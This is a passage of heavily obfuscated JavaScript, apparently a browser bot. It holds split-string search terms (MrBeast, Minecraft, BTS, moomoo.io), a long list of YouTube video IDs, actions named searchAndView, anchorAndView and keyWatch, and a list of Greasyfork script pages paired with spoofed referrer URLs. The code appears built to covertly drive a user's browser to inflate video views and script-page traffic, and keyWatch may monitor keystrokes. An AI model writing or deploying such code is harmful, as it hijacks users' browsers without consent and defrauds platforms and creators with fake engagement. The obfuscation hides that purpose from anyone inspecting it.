'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + V(0x2) + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + V(0x14) + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1ae0 + 0x1 * 0x482 + -0x1f58)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x2 * -0x4d2 + 0x151c + 0x1 * -0x1eb6)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + W(0x9) + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1d * 0xa9 + -0xf * 0x9e + -0x9e0);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    W(0xa) + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    V(0xd) + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    T(0xb, '6RJs') + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    T(0x13, ']kx5') + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + V(0x0) + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + W(0x15)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
